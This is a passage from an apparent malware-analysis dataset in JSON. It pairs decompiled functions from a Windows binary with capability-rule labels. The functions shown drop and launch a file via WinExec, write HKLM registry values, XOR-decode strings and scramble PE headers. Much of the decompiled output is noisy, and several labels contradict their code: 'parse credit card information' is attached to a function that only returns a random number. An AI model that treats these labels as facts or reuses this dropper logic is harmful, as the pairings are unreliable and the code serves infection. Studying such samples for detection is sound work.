 uVar25 = 0;\n    while( true ) {\n        fcn.00402190(0x410584, CONCAT13(uVar25, CONCAT21(uVar23, uVar8)), uVar5, \n                     CONCAT13(uVar30, CONCAT12(uVar28, CONCAT11(uVar27, uVar29))));\n        uVar6 = fcn.00402190(0x410584, 9, 0x406204, 0x33);\n        uVar14 = uVar6 < extraout_ECX_02;\n        cVar18 = SBORROW4(uVar6, extraout_ECX_02);\n        cVar2 = uVar6 - extraout_ECX_02 < 0;\n        uVar16 = uVar6 == extraout_ECX_02;\n        uVar38 = 0;\n        uVar39 = 0;\n        uVar40 = 0;\n        uVar37 = 0x38;\n        uVar36 = 9;\n        uVar21 = 0;\n        uVar24 = 0;\n        uVar26 = 0;\n        uVar34 = 0x4105;\n        uVar35 = 0;\n        iVar4 = fcn.00402190(0x410584, 9, 0x406238, 10);\n        if ((!uVar16 && cVar18 == cVar2) && (uVar16 || cVar18 != cVar2)) {\n            *(iVar4 + 0x6a39da56) = *(iVar4 + 0x6a39da56) ^ extraout_CL_01;\n            uVar14 = 0x97 < iVar4;\n            cVar18 = SCARRY4(&stack0xffffffd1, 1);\n            cVar2 = &stack0xffffffd2 < 0;\n            uVar16 = *0x10 == 0x2e;\n        }\n        uVar22 = 9;\n        uVar32 = 0;\n        uVar33 = 0;\n        fcn.00402190(0x410584, 9, CONCAT13(uVar36, CONCAT12(uVar35, uVar34)), \n                     CONCAT13(uVar37, CONCAT12(uVar26, CONCAT11(uVar24, uVar21))));\n        if ((uVar16 || cVar18 != cVar2) || (!uVar16 && cVar18 == cVar2)) break;\n        if (extraout_ECX_03 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        puVar10 = CONCAT13(uVar33, CONCAT12(uVar32, uVar22));\n        pcVar7 = CONCAT13(uVar31, CONCAT12(uVar40, CONCAT11(uVar39, uVar38))) + 9;\n        *pcVar7 = *pcVar7 + cVar41;\n    }\n    fcn.00402190(0x410584, 9, 0x406248, 5);\n    uVar5 = extraout_EDX_00;\n    if (uVar14) goto code_r0x004038ea;\n    while( true ) {\n        uVar25 = uVar5 >> 0x10;\n        uVar8 = uVar5 >> 0x18;\n        if (uVar14) {\n            *(puVar10 + 0x43d1773a) = *(puVar10 + 0x43d1773a) ^ 0x6a27e95e;\n            uVar23 = in_ES;\n        }\n        else {\ncode_r0x004038ea:\n            uVar23 = 6;\n            uVar25 = 0;\n            uVar8 = 0;\n        }\n        fcn.00402190(0x410584, 9, 0x406250, CONCAT13(uVar8, CONCAT12(uVar25, uVar23)));\n        uVar14 = 0xffffffbf < &stack0xffffffaa;\n        if ((uVar14 || *0x10 == 0x16) || (!uVar14 && *0x10 != 0x16)) break;\n        uVar5 = extraout_EDX_01;\n        if (!SCARRY4(&stack0xffffffaa, 0x40)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00402190(0x410584, 9, 0x406258, 0xc);\n    fcn.00402190(0x410584, 9, 0x406264, 0xc);\n    fcn.00402190(0x410584, 9, 0x40629c, 0x2a);\n    fcn.00402190(0x410584, 9, 0x4062c8, 0xb);\n    fcn.00402190(0x410584, 9, 0x406324, 0x41);\n    fcn.00402190(0x410584, 9, 0x406368, 0x33);\n    fcn.00402190(0x410584, 9, 0x40639c, 0x4b);\n    fcn.00402190(0x410584, 9, 0x4063e8, 0x39);\n    fcn.00402190(0x410584, 9, 0x406424, 8);\n    fcn.00402190(0x410584, 9, 0x40642c, 0x14);\n    return;\n}\n",
        "token_count": 4558
    },
    "004012d0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t fcn.004012d0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint auStack24 [4];\n    uint uStack8;\n    uint uStack4;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(param_1);\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrA;\n    auStack24[0] = 0x4062d4;\n    auStack24[1] = 0x4062e0;\n    auStack24[2] = 0x4062ec;\n    auStack24[3] = 0x4062f4;\n    uStack8 = 0x406300;\n    uStack4 = 0x40630c;\n    uVar3 = 0;\n    puVar4 = auStack24;\n    do {\n        iVar2 = (*pcVar1)(param_1, *puVar4);\n        if (iVar2 != 0) {\n            return uVar3;\n        }\n        uVar3 = uVar3 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar3 < 6);\n    return 0xffffffff;\n}\n",
        "token_count": 287
    },
    "00402370": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402370(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401f00();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00402560();\n        arg_ch_01 = fcn.00402560();\n        arg_ch_02 = fcn.00402560();\n        fcn.00403f80(arg_10h, arg_ch_00);\n        fcn.00403f80(arg_8h, arg_ch_01);\n        fcn.00403f80(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x406024, &lpBuffer, arg_10h);\n        iVar2 = fcn.00402e70(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x406030, &lpBuffer, arg_8h);\n            iVar2 = fcn.00402e70(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x406030, &lpBuffer, arg_ch);\n                iVar2 = fcn.00402e70(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00403f80(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 613
    },
    "00402a80": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402b52) overlaps instruction at (ram,0x00402b4e)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402a80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uchar uVar3;\n    uint8_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    bool bVar10;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    puVar5 = fcn.00403230(arg_18h, arg_1ch, 0x406054, 7);\n    piVar1 = _sym.imp.MSVCRT.dll_rand;\n    if (puVar5 == NULL) {\n        return 0;\n    }\n    var_24h = 0;\n    puVar9 = &var_23h;\n    var_4h = puVar5;\n    for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    uVar7 = 0;\n    do {\n        uVar3 = (*piVar1)();\n        iVar6 = extraout_ECX;\n        while( true ) {\n            uVar8 = uVar7;\n            (&var_24h)[uVar8] = uVar3;\n            uVar7 = uVar8 + 1;\n            bVar10 = uVar7 < 0x20;\n            if (bVar10) break;\n            if ((bVar10) || (!bVar10)) {\n                iVar6 = 8;\n                goto code_r0x00402b57;\n            }\n            iVar6 = iVar6 + -1;\n            if (iVar6 == 0 || uVar7 != 0x20) {\n                *piVar1 = uVar8 + 5;\n                puVar2 = *0x9750e2b5;\n                uVar4 = *0x9750e2b5;\n                **0x9750e2b5 = **0x9750e2b5 | uVar4;\n                *puVar2 = *puVar2 + uVar4;\ncode_r0x00402b57:\n                puVar9 = &var_24h;\n                for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar5 = *puVar9;\n                    puVar9 = puVar9 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n                fcn.004017a0(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n                fcn.00401660(arg_18h, arg_1ch);\n                return 1;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 754
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004024e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402511) overlaps instruction at (ram,0x00402510)\n// \n\nuint fcn.004024e0(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    bool bVar3;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    bVar3 = SBORROW4(&stack0xfffffffc, 0x94);\n    cVar2 = &lpVersionInformation < 0;\n    bVar1 = *0x10 == 0x98;\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if ((!bVar1 && bVar3 == cVar2) && (bVar1 || bVar3 != cVar2)) {\n        if (!bVar3) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((!SBORROW4(var_90h, 5)) && (SBORROW4(var_90h, 5))) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 355
    },
    "00402cc0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402cc0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40608c, arg_8h);\n    (*pcVar2)(&var_264h, 0x4060a4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4060cc;\n    var_30h = 0x4060d8;\n    var_2ch = 0x4060e4;\n    var_28h = 0x4060f4;\n    var_24h = 0x4060fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1096
    },
    "00401a60": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint fcn.00401a60(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint unaff_EDI;\n    uint uStack52;\n    int32_t iStack48;\n    \n    iVar1 = sub.VERSION.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        uStack52 = 2;\n        iStack48 = iVar1;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GlobalLock)(uVar2);\n        sub.VERSION.dll_GetFileVersionInfoA(param_1, param_1, iVar1, uVar3);\n        sub.VERSION.dll_VerQueryValueA(uVar3, 0x406520, &uStack52, &stack0xffffffe0);\n        (*_sym.imp.MSVCRT.dll_sprintf)\n                  (unaff_EDI, 0x4064e0, *(param_1 + 0x10) >> 0x10, *(param_1 + 0x10), *(param_1 + 0x14) >> 0x10, \n                   *(param_1 + 0x14));\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n        return 1;\n    }\n    return 1;\n}\n",
        "token_count": 314
    },
    "004040d0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404125) overlaps instruction at (ram,0x00404124)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004040d0(uint32_t arg_8h, uint16_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint16_t *puVar1;\n    bool bVar2;\n    \n    puVar1 = arg_ch;\n    bVar2 = false;\n    if (arg_10h == 0) {\n        return (arg_8h >> 0x10) + arg_8h;\n    }\n    arg_ch = arg_10h;\n    do {\n        if (((bVar2 == arg_ch < 0) && (bVar2 != arg_ch < 0)) && (arg_8h = arg_ch,  *0x10 != 0x10)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        arg_8h = arg_8h + *puVar1;\n        if (arg_8h >> 0x10 != 0) {\n            arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n        }\n        puVar1 = puVar1 + 1;\n        bVar2 = SBORROW4(arg_ch, 1);\n        arg_ch = arg_ch - 1;\n    } while (arg_ch != NULL);\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 363
    },
    "00403030": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403030(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00403f80(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x406444, acStack1304, &uStack2112);\n    uStack2088 = 0x4064fc;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x406514;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00402f90(auStack1564, 0x406440, acStack1045 + 1, ~uVar3 - 1, 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1848
    },
    "00404650": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004046f4) overlaps instruction at (ram,0x004046f0)\n// \n// WARNING: Removing unreachable block (ram,0x004046e8)\n// WARNING: Removing unreachable block (ram,0x004046f0)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404650(int16_t *arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    char in_CL;\n    uint32_t uVar3;\n    int16_t *in_EDX;\n    uint8_t *unaff_EBX;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    bool bVar8;\n    bool in_SF;\n    char in_stack_00000056;\n    uint var_4h;\n    \n    if ((in_SF) || (!in_SF)) {\n        bVar8 = *arg_8h == 0x5a4d;\n        in_EDX = arg_8h;\n    }\n    else {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        bVar8 = in_CL == in_stack_00000056;\n    }\n    if (!bVar8) {\n        return 0;\n    }\n    if (*(*(in_EDX + 0x1e) + in_EDX) != 0x4550) {\n        return 0;\n    }\n    if ((*(in_EDX + 0x1e) + in_EDX)[0x16] == 0) {\n        uVar6 = 0x40;\n        if (*(arg_8h + 0x1e) < 0x81) {\n            return 0;\n        }\n        if (*(arg_8h + 0x1e) < 0xc0) {\n            uVar6 = *(arg_8h + 0x1e) - 0x80;\n        }\n        puVar1 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(uVar6);\n        if (puVar1 != NULL) {\n            uVar3 = 0;\n            if (uVar6 != 0) {\n                do {\n                    iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n                    uVar4 = uVar3 + 1;\n                    *(uVar3 + puVar1) = iVar2 % 0xff;\n                    uVar3 = uVar4;\n                } while (uVar4 < uVar6);\n            }\n            puVar5 = puVar1;\n            puVar7 = arg_8h + 0x40;\n            for (uVar3 = uVar6 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar7 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                *puVar7 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 768
    },
    "00402130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402130(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402310;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x40651c;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00402190": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004021ed) overlaps instruction at (ram,0x004021eb)\n// \n\nvoid __cdecl fcn.00402190(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    char cVar4;\n    int32_t iVar3;\n    uint32_t in_ECX;\n    char *pcVar5;\n    uint8_t uVar6;\n    uint *puVar7;\n    uint8_t uVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    \n    puVar7 = NULL;\n    if (0 < arg_14h) {\n        do {\n            pcVar5 = puVar7 % arg_ch;\n            uVar8 = 0;\n            uVar6 = *(puVar7 + arg_10h) ^ pcVar5[arg_8h];\n            bVar9 = (POPCOUNT(uVar6) & 1U) != 0;\n            iVar3 = arg_8h;\n            if ((bVar9) && (!bVar9)) {\n                puVar2 = puVar7 + 1;\n                out(*puVar7, pcVar5);\n                uVar8 = in_AF;\n                do {\n                    cVar4 = iVar3 >> 8;\n                    uVar8 = 9 < (iVar3 & 0xf) | uVar8;\n                    iVar3 = CONCAT31(CONCAT21(iVar3 >> 0x10, cVar4 - uVar8), -uVar8);\n                    puVar7 = puVar2;\n                    in_AF = uVar8;\n                } while (uVar8 || cVar4 == *pcVar5);\n            }\n            piVar1 = arg_10h + pcVar5 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - uVar8;\n            *(in_ECX + 0x53) = iVar3;\n            uVar6 = arg_14h ^ uVar6;\n            in_ECX = in_ECX & 0xffffff00 | uVar6;\n            *(puVar7 + arg_10h) = uVar6;\n            puVar7 = puVar7 + 1;\n        } while (puVar7 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 526
    },
    "00402560": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nint32_t fcn.00402560(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00404190": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404244) overlaps instruction at (ram,0x00404240)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004041f5)\n\nuint fcn.00404190(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint8_t extraout_CL;\n    uint extraout_ECX;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar6;\n    ulong uVar7;\n    uchar auStack800 [260];\n    uchar auStack540 [260];\n    uchar auStack280 [260];\n    uchar auStack20 [4];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack16 = 0x104;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&stack0xfffffde4, &stack0xfffffff0);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uStack8 = 0x104;\n    uStack12 = 0x104;\n    uVar7 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                      (0, &stack0xfffffde4, &stack0xfffffee8, &stack0xfffffff8, &stack0xfffffce0, &stack0xfffffff4, \n                       &stack0xffffffec);\n    puVar3 = uVar7;\n    bVar6 = puVar3 == NULL;\n    if (!bVar6) {\n        if ((bVar6) || (iVar2 = uVar7 >> 0x20,  !bVar6)) 